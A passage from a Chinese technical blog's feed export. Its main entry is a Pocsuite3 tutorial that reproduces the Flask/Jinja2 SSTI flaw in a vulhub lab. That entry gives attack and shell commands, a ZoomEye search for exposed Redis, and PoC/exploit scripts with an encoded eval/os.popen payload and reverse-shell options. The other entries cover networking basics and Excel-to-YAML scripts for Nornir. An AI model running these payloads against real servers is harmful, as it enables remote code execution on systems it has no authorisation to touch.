<p>（2）数据转发所依据的对象不同<br>交换机是利用物理地址或者说MAC地址来确定转发数据的目的地址。而路由器则是利用IP地址来确定数据转发的地址。IP地址是在软件中实现的，描述的是设备所在的网络。MAC地址通常是硬件自带的，由网卡生产商来分配的，而且已经固化到了网卡中去，一般来说是不可更改的。而IP地址则通常由网络管理员或系统自动分配。 </p>
<p>（3）传统的交换机只能分割冲突域，不能分割广播域；而路由器可以分割广播域<br>由交换机连接的网段仍属于同一个广播域，广播数据包会在交换机连接的所有网段上传播，在某些情况下会导致通信拥挤和安全漏洞。连接到路由器上的网段会被分配成不同的广播域，广播数据不会穿过路由器。虽然第三层以上交换机具有VLAN功能，也可以分割广播域，但是各子广播域之间是不能通信交流的，它们之间的交流仍然需要路由器。 </p>
<p>（4）路由器提供了防火墙的服务<br>路由器仅仅转发特定地址的数据包，不传送不支持路由协议的数据包传送和未知目标网络数据包的传送，从而可以防止广播风暴。</p>
<p>原文链接：<a href="https://blog.csdn.net/yaopeng_2005/article/details/7064869">https://blog.csdn.net/yaopeng_2005/article/details/7064869</a></p>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>OSI七层</tag>
      </tags>
  </entry>
  <entry>
    <title>Pocsuite3编写poc</title>
    <url>/archives/aa059821.html</url>
    <content><![CDATA[<p>Pocsuite是由“知道创宇404实验室”打造的一款开源的远程漏洞测试框架。它是知道创宇安全研究团队发展的基石，是团队发展至今一直维护的一个项目。</p>
<span id="more"></span>

<h1 id="Pocsuite3的安装"><a href="#Pocsuite3的安装" class="headerlink" title="Pocsuite3的安装"></a>Pocsuite3的安装</h1><ul>
<li>通过git命令来克隆代码仓库中的最新源代码。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:nopesec/pocsuite3.git</span><br></pre></td></tr></table></figure>

<ul>
<li>下载zip压缩包进行安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/knownsec/pocsuite3/archive/master.zip</span><br></pre></td></tr></table></figure>

<ul>
<li>使用pip命令进行安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install pocsuite3</span><br></pre></td></tr></table></figure>

<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ul>
<li>Verify验证模式，验证目标是否存在漏洞。-r为脚本路径，-u为目标地址，命令如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pocsuite.py -r pocs/test1.py -u http://192.168.150.15 --verify</span><br></pre></td></tr></table></figure>

<ul>
<li>批量验证，将需要验证的所有目标IP写到一个txt文件中批量使用，命令如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pocsuite.py -r pocs/test1.py -f url.txt --verify</span><br></pre></td></tr></table></figure>

<ul>
<li>加载文件夹下的所有poc对目标进行测试，-r为文件夹路径，命令如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pocsuite.py -r pocs/* -u http://192.168.150.15 --verify</span><br></pre></td></tr></table></figure>

<ul>
<li>使用多线程。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pocsuite.py -r pocs/test1.py -u http://192.168.150.15 --verify --threads 10</span><br></pre></td></tr></table></figure>

<ul>
<li>使用Zoomeye搜索引擎，搜索开放端口为6379的Redis服务，命令如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cli.py --dork &#x27;port:6379&#x27; --vul-keyword &#x27;redis&#x27; --max-page 2</span><br></pre></td></tr></table></figure>

<ul>
<li>Attack模式，向目标发起有效攻击在。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pocsuite.py -r pocs/test1.py -u http://192.168.150.15 --attack</span><br></pre></td></tr></table></figure>

<ul>
<li>使用shell交互模式，对目标进行远程控制，命令如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pocsuite.py -r pocs/test1.py -u http://192.168.150.15 --shell</span><br></pre></td></tr></table></figure>

<ul>
<li>使用自定义命令’command’,调用外部传递参数，进行半交互式命令执行，命令如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pocsuite.py -u http://192.168.150.15 -r pocs/test1.py --attack --command &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<h1 id="flask-ssti漏洞复现"><a href="#flask-ssti漏洞复现" class="headerlink" title="flask ssti漏洞复现"></a>flask ssti漏洞复现</h1><h2 id="Flask简介"><a href="#Flask简介" class="headerlink" title="Flask简介"></a>Flask简介</h2><p>Flask 是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。</p>
<p>Flask属于微框架，这既是优点也是缺点，优点是框架轻量，更新依赖少，更容易专注于安全方面的漏洞，缺点是不得不通过添加插件来增加依赖列表。Flask依赖中就有造成模板注入漏洞的插件jinja2的模板引擎，Jinja2是一个面向Python的模板语言。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境实在docker环境下建立的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 下载靶场源码</span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"></span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line">// 进入漏洞环境目录</span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line">// 编译下载漏洞环境所需配置</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">// 启动漏洞环境</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>


<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/flask.png"></p>
<p>从这里可以看到靶机运行在8000端口，查看app源代码可以看出name的值是直接从get参数中获取的，所以Template是完全可控的。先手动测以下：</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/flask1.png"></p>
<h2 id="POC脚本的编写"><a href="#POC脚本的编写" class="headerlink" title="POC脚本的编写"></a>POC脚本的编写</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from urllib.parse import urljoin</span><br><span class="line">import re</span><br><span class="line">from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE</span><br><span class="line">from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY</span><br><span class="line"></span><br><span class="line">class DemoPOC(POCBase):</span><br><span class="line">    vulID = &#x27;1.1&#x27;           //ssvid ID，如果提交漏洞的同时提交poc，则写成0</span><br><span class="line">    version = &#x27;1.1&#x27;         // 默认为1</span><br><span class="line">    author = [&#x27;1.1&#x27;]        //poc作者名字</span><br><span class="line">    vulDate = &#x27;1.1&#x27;         //漏洞公开的日期</span><br><span class="line">    createDate = &#x27;1.1&#x27;      //编写poc的日期</span><br><span class="line">    updateDate = &#x27;1.1&#x27;       //poc更新的时间</span><br><span class="line">    references = [&#x27;1.1&#x27;]    // 漏洞地址来源</span><br><span class="line">    name = &#x27;flack&#x27;          //poc名称</span><br><span class="line">    appPowerLink = &#x27;flack&#x27;  //漏洞厂商的主页地址</span><br><span class="line">    appName = &#x27;flask&#x27;       //漏洞应用名称</span><br><span class="line">    appVersion = &#x27;flask&#x27;    //漏洞影响版本</span><br><span class="line">    vulType = VUL_TYPE.CODE_EXECUTION //漏洞类型</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;                //漏洞简要描述</span><br><span class="line">    samples = [&#x27;96.234.71.117:80&#x27;]  //测试样例。</span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.REMOTE </span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        path = &quot;/?name=&quot;</span><br><span class="line">        url = urljoin(self.url,path)</span><br><span class="line">        payload = &quot;&#123;&#123;22*22&#125;&#125;&quot;</span><br><span class="line">        resq = requests.get(url + payload)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line"></span><br><span class="line">           if resq and resq.status_code == 200 and &quot;484&quot; in resq.text:</span><br><span class="line">              result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span><br><span class="line">              result[&#x27;VerifyInfo&#x27;][&#x27;url&#x27;] = url</span><br><span class="line">              result[&#x27;VerifyInfo&#x27;][&#x27;Name&#x27;] = payload</span><br><span class="line">        except Exception as e:</span><br><span class="line">           pass</span><br><span class="line">        return self.parse_output(result)</span><br><span class="line">    def parse_output(self,result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">           output.success(result)</span><br><span class="line">        else:</span><br><span class="line">           output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line">    def _attck(self):</span><br><span class="line">        return self._verify()</span><br><span class="line"></span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/flask2.png"></p>
<h2 id="exp脚本编写"><a href="#exp脚本编写" class="headerlink" title="exp脚本编写"></a>exp脚本编写</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from urllib.parse import urljoin</span><br><span class="line">import re</span><br><span class="line">from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE</span><br><span class="line">from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class DemoPOC(POCBase):</span><br><span class="line">    vulID = &#x27;1.1&#x27;</span><br><span class="line">    version = &#x27;1.1&#x27;</span><br><span class="line">    author = [&#x27;1.1&#x27;]</span><br><span class="line">    vulDate = &#x27;1.1&#x27;</span><br><span class="line">    createDate = &#x27;1.1&#x27;</span><br><span class="line">    updateDate = &#x27;1.1&#x27;</span><br><span class="line">    references = [&#x27;1.1&#x27;]</span><br><span class="line">    name = &#x27;flack&#x27;</span><br><span class="line">    appPowerLink = &#x27;flack&#x27;</span><br><span class="line">    appName = &#x27;flask&#x27;</span><br><span class="line">    appVersion = &#x27;flask&#x27;</span><br><span class="line">    vulType = VUL_TYPE.CODE_EXECUTION</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    samples = [&#x27;96.234.71.117:80&#x27;]</span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.REMOTE</span><br><span class="line"></span><br><span class="line">    def _options(self):</span><br><span class="line">        o = OrderedDict()</span><br><span class="line">        payload = &#123;</span><br><span class="line">            &quot;nc&quot;: REVERSE_PAYLOAD.NC,</span><br><span class="line">            &quot;bash&quot;: REVERSE_PAYLOAD.BASH,</span><br><span class="line">        &#125;</span><br><span class="line">        o[&quot;command&quot;] = OptDict(selected=&quot;bash&quot;, default=payload)</span><br><span class="line">        return o</span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        # 攻击代码</span><br><span class="line"></span><br><span class="line">    def trim(str):</span><br><span class="line">        newstr = &#x27;&#x27;</span><br><span class="line">        for ch in str:  # 遍历每一个字符串</span><br><span class="line">            if ch != &#x27; &#x27;:</span><br><span class="line">                newstr = newstr + ch</span><br><span class="line">        return newstr</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        path = &quot;?name=&quot;</span><br><span class="line">        url = self.url + path</span><br><span class="line">        # print(url)</span><br><span class="line">        cmd = self.get_option(&quot;command&quot;)</span><br><span class="line">        payload = &#x27;name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D&#x27;</span><br><span class="line">        # print(payload)</span><br><span class="line">        try:</span><br><span class="line">            resq = requests.get(url + payload)</span><br><span class="line">            t = resq.text</span><br><span class="line">            t = t.replace(&#x27;\n&#x27;, &#x27;&#x27;).replace(&#x27;\r&#x27;, &#x27;&#x27;)</span><br><span class="line">            print(t)</span><br><span class="line">            t = t.replace(&quot; &quot;, &quot;&quot;)</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Name&#x27;] = payload</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return</span><br><span class="line">        return self.parse_attack(result)</span><br><span class="line"></span><br><span class="line">    def parse_attack(self, result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">    def _shell(self):</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def parse_verify(self, result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/flask3.png"></p>
<p>利用pocsuite 3开源框架，可以接收用户输入的命令行参数，对目标系统进行半交互控制，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from urllib.parse import urljoin</span><br><span class="line">import re</span><br><span class="line">from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE</span><br><span class="line">from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class DemoPOC(POCBase):</span><br><span class="line">    vulID = &#x27;1.1&#x27;</span><br><span class="line">    version = &#x27;1.1&#x27;</span><br><span class="line">    author = [&#x27;1.1&#x27;]</span><br><span class="line">    vulDate = &#x27;1.1&#x27;</span><br><span class="line">    createDate = &#x27;1.1&#x27;</span><br><span class="line">    updateDate = &#x27;1.1&#x27;</span><br><span class="line">    references = [&#x27;flask&#x27;]</span><br><span class="line">    name = &#x27;flask&#x27;</span><br><span class="line">    appPowerLink = &#x27;flask&#x27;</span><br><span class="line">    appName = &#x27;flask&#x27;</span><br><span class="line">    appVersion = &#x27;flask&#x27;</span><br><span class="line">    vulType = VUL_TYPE.CODE_EXECUTION</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    samples = [&#x27;96.234.71.117:80&#x27;]</span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.REMOTE</span><br><span class="line"></span><br><span class="line">    def _options(self):</span><br><span class="line">        o = OrderedDict()</span><br><span class="line">        payload = &#123;</span><br><span class="line">            &quot;nc&quot;: REVERSE_PAYLOAD.NC,</span><br><span class="line">            &quot;bash&quot;: REVERSE_PAYLOAD.BASH,</span><br><span class="line">        &#125;</span><br><span class="line">        o[&quot;command&quot;] = OptDict(selected=&quot;bash&quot;, default=payload)</span><br><span class="line">        return o</span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        path = &quot;?name=&quot;</span><br><span class="line">        url = self.url + path</span><br><span class="line">        # print(url)</span><br><span class="line">        payload = &quot;&#123;&#123;22*22&#125;&#125;&quot;</span><br><span class="line">        # print(payload)</span><br><span class="line">        try:</span><br><span class="line">            resq = requests.get(url + payload)</span><br><span class="line">            if resq and resq.status_code == 200 and &quot;484&quot; in resq.text:</span><br><span class="line">                result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span><br><span class="line">                result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url</span><br><span class="line">                result[&#x27;VerifyInfo&#x27;][&#x27;Name&#x27;] = payload</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return</span><br><span class="line">        return self.parse_verify(result)</span><br><span class="line"></span><br><span class="line">    def trim(str):</span><br><span class="line">        newstr = &#x27;&#x27;</span><br><span class="line">        for ch in str:  # 遍历每一个字符串</span><br><span class="line">            if ch != &#x27; &#x27;:</span><br><span class="line">                newstr = newstr + ch</span><br><span class="line">        return newstr</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        path = &quot;?name=&quot;</span><br><span class="line">        url = self.url + path</span><br><span class="line">        # print(url)</span><br><span class="line">        cmd = self.get_option(&quot;command&quot;)</span><br><span class="line">        payload = &#x27;name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(&quot;os&quot;).popen(&quot;id&quot;).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D&#x27;</span><br><span class="line">        # print(payload)</span><br><span class="line">        try:</span><br><span class="line">            resq = requests.get(url + payload)</span><br><span class="line">            t = resq.text</span><br><span class="line">            t = t.replace(&#x27;\n&#x27;, &#x27;&#x27;).replace(&#x27;\r&#x27;, &#x27;&#x27;)</span><br><span class="line">            print(t)</span><br><span class="line">            t = t.replace(&quot; &quot;, &quot;&quot;)</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Name&#x27;] = payload</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return</span><br><span class="line">        return self.parse_attack(result)</span><br><span class="line"></span><br><span class="line">    def parse_attack(self, result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">    def _shell(self):</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def parse_verify(self, result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/flask4.png"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li>Python安全攻防渗透测试指南</li>
</ul>
]]></content>
      <categories>
        <category>网络安全攻防</category>
      </categories>
      <tags>
        <tag>poc</tag>
        <tag>exp</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3实现excel文件转yaml格式文件</title>
    <url>/archives/be95c36b.html</url>
    <content><![CDATA[<p>最近在使用Nornir框架对网络设备进行备份时，遇到了一个相对比较棘手的问题，因为Nornir需要hosts.yaml，一个一个写的话几百台设备信息不知道要写到什么时候去，因此写了一个python脚本实现自动从excel文件读取设备IP地址，端口等信息，自动写入yaml文件。</p>
<span id="more"></span>

<h1 id="excel文件"><a href="#excel文件" class="headerlink" title="excel文件"></a>excel文件</h1><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/excel.png"></p>
<h1 id="脚本内容"><a href="#脚本内容" class="headerlink" title="脚本内容"></a>脚本内容</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import xlrd, json, yaml</span><br><span class="line"></span><br><span class="line">def main(file_name):</span><br><span class="line">    table_name = xlrd.open_workbook(file_name)</span><br><span class="line">    sheet_name = table_name.sheet_by_index(0)</span><br><span class="line"></span><br><span class="line">    for k in range(1,sheet_name.nrows):</span><br><span class="line">        data = sheet_name.row_values(k)</span><br><span class="line"></span><br><span class="line">        dict_json = &#123;</span><br><span class="line">            data[0]: &#123;&quot;hostname&quot;: data[1], &quot;port&quot;: int(data[2])&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        excel_to_json = json.dumps(dict_json)</span><br><span class="line">        json_to_yaml = yaml.load(excel_to_json, Loader=yaml.FullLoader)</span><br><span class="line">        print(json_to_yaml)</span><br><span class="line"></span><br><span class="line">        with open(&#x27;host.yaml&#x27;,encoding=&#x27;utf-8&#x27;,mode=&#x27;a&#x27;,) as f:</span><br><span class="line">            yaml.safe_dump(json_to_yaml,f,allow_unicode=True)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main(file_name= input(&quot;文件路径：&quot;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>目前为初级版本，后期考虑模块化。</li>
</ul>
<h1 id="脚本执行结果"><a href="#脚本执行结果" class="headerlink" title="脚本执行结果"></a>脚本执行结果</h1><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/excel_to_yaml.png"></p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
<li>目前只测试了xlsx和xls格式表格</li>
<li>xlrd版本为1.2，最新版本不支持xlsx</li>
</ul>
<h2 id="脚本第二版"><a href="#脚本第二版" class="headerlink" title="脚本第二版"></a>脚本第二版</h2><ul>
<li><a href="https://vkali.com/archives/808e44d5.html">Python3实现excel文件转yaml格式文件（二）</a></li>
</ul>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>Nornir</tag>
        <tag>Excel转Yaml</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3实现excel文件转yaml格式文件（二）</title>
    <url>/archives/808e44d5.html</url>
    <content><![CDATA[<p>经过小伙伴的使用，第一个版本出现的很多问题，因此重构了一下脚本，思路基本不变，实现了当某一列的其中有空值，则不写入Yaml文件。</p>
<span id="more"></span>

<h2 id="示例表格文件"><a href="#示例表格文件" class="headerlink" title="示例表格文件"></a>示例表格文件</h2><p>这里需要注意的是，脚本判定以逗号（英文逗号）为换行，并实现自定义缩进。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/nornir/groups.png"></p>
<h2 id="转换效果图"><a href="#转换效果图" class="headerlink" title="转换效果图"></a>转换效果图</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/nornir/hosts.png"></p>
<p>这里由于Windows系统编码问题，导致中文乱码，只是显示问题不影响Nornir脚本执行，点击上方以GBK编码显示就可以了，我在Linux上测试了一下，显示中文是正常的。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/nornir/hosts_yaml.png"></p>
<h2 id="脚本文件"><a href="#脚本文件" class="headerlink" title="脚本文件"></a>脚本文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import xlrd</span><br><span class="line">import collections</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(table_name, outfile_name):</span><br><span class="line">    table_name = xlrd.open_workbook(table_name)</span><br><span class="line">    sheet_name = table_name.sheet_by_index(0)</span><br><span class="line">    title = sheet_name.row_values(0)</span><br><span class="line"></span><br><span class="line">    for i in range(1, sheet_name.nrows):</span><br><span class="line">        data = sheet_name.row_values(i)</span><br><span class="line"></span><br><span class="line">        info_dict = collections.OrderedDict()</span><br><span class="line">        for k in range(1, len(title)):</span><br><span class="line"></span><br><span class="line">            # 如果空字符串或空置，跳过</span><br><span class="line">            if data[k] == &#x27;&#x27; or data[k] is None:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            # 如果是字符串，转换为列表或字符串</span><br><span class="line">            if isinstance(data[k], str):</span><br><span class="line">                # 如果有逗号，识别为列表</span><br><span class="line">                if &#x27;,&#x27; in data[k]:</span><br><span class="line">                    dl = data[k].split(&#x27;,&#x27;)</span><br><span class="line">                    dl = [x for x in dl if x != &#x27;&#x27; and x is not None]   # 去除列表中空字符串和空值</span><br><span class="line">                    dl_type = int</span><br><span class="line"></span><br><span class="line">                    # 检测列表中是否全是数字</span><br><span class="line">                    for j in dl:</span><br><span class="line">                        try:</span><br><span class="line">                            int(j)</span><br><span class="line">                        except:</span><br><span class="line">                            dl_type = str</span><br><span class="line">                            break</span><br><span class="line"></span><br><span class="line">                    # 如果列表中全是数字，把列表转换为int类型</span><br><span class="line">                    if dl_type == int:</span><br><span class="line">                        dl = list(map(int, dl))</span><br><span class="line"></span><br><span class="line">                    info_dict[title[k]] = dl</span><br><span class="line">                else:</span><br><span class="line">                    info_dict[title[k]] = data[k]</span><br><span class="line"></span><br><span class="line">            # 如果为float类型，转换int</span><br><span class="line">            if isinstance(data[k], float):</span><br><span class="line">                info_dict[title[k]] = int(data[k])</span><br><span class="line"></span><br><span class="line">        data_dict = collections.OrderedDict()</span><br><span class="line">        data_dict[data[0]] = info_dict</span><br><span class="line"></span><br><span class="line">        # 打开文件把字典以yaml格式写入</span><br><span class="line">        with open(outfile_name, mode=&#x27;a&#x27;) as f:</span><br><span class="line">            f.write(dict_to_yaml(data_dict))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dict_to_yaml(dict_data):</span><br><span class="line">    s = &quot;&quot;</span><br><span class="line">    hh_code = &quot;\n&quot;  # 换行符</span><br><span class="line">    sj_code = &quot; &quot; * 2  # 缩进符，两个空格</span><br><span class="line">    for key, value in dict_data.items():</span><br><span class="line">        s += key + &quot;:&quot; + hh_code</span><br><span class="line">        print(s)</span><br><span class="line">        for key2, value2 in value.items():</span><br><span class="line">            s += sj_code + key2 + &quot;: &quot;</span><br><span class="line">            if isinstance(value2, list):</span><br><span class="line">                s += hh_code</span><br><span class="line">                for value3 in value2:</span><br><span class="line">                    s += sj_code * 2 + &quot;- &quot; + str(value3) + hh_code</span><br><span class="line">            else:</span><br><span class="line">                s += str(value2) + hh_code</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # 函数运行</span><br><span class="line">    main(table_name=&#x27;ip.xls&#x27;, outfile_name=&#x27;hosts.yaml&#x27;)</span><br><span class="line"></span><br><span class="line">    # 命令行参数运行  python3 test.py 主机名表格.xls yaml文件.txt</span><br><span class="line">    # main(table_name=sys.argv[1], outfile_name=sys.argv[2])</span><br></pre></td></tr></table></figure>

<p>经过测试，在Windows平台或者Linux平台脚本转换出来的Yaml文件都可以正常被调用。</p>
<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><ul>
<li><a href="https://vkali.com/archives/be95c36b.html">Python3实现excel文件转yaml格式文件</a></li>
<li><a href="https://vkali.com/archives/4cf87063.html">使用Nornir3自动化备份交换机配置</a></li>
<li><a href="https://vkali.com/archives/dba96ee5.html">使用Nornir3自动化配置交换机</a></li>
</ul>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>Nornir</tag>
        <tag>Excel转Yaml</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu搭建zabbix5.0</title>
    <url>/archives/233559f4.html</url>
    <content><![CDATA[<p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。 zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。 zabbix由两部分部分构成，zabbix server与可选组件zabbix agent,也可以基于SNMP进行监控。</p>
<span id="more"></span>

